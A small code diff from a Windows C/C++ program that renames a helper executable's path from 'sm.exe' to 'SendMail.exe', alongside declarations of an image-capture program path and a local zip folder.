@@ -32,7 +32,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	char tmp[64];
 	char numtostr[64];
 	char *capProPath = "C:\\captureImageExe.exe";
-	char *sendProPath = "C:\\sm.exe";
+	char *sendProPath = "C:\\SendMail.exe";
 	char *zipPath = "C:\\Users\\canzha\\Desktop\\big\\";
 	strcpy(tmp, "C:\\Users\\canzha\\Desktop\\big\\");
 	for(;;)
